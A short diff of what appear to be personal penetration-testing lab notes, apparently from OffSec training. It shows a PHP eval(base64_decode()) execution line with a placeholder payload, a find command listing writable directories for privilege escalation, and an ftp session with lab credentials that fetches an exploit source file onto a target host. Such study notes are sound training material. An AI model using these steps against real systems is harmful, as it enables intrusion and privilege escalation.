@@ -55,7 +55,15 @@ fclose($fh);
 eval(base64_decode("<base64encode php script> without php tags"));
 ?>
 
+# find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 
+the above wiindow technique wont exactly work for linux. some changes.
 
+$ ftp -n <<EOF
+> open 10.11.0.154 21
+> user offsec tornado1
+> ascii
+> get 28718.c
+> EOF
 
 
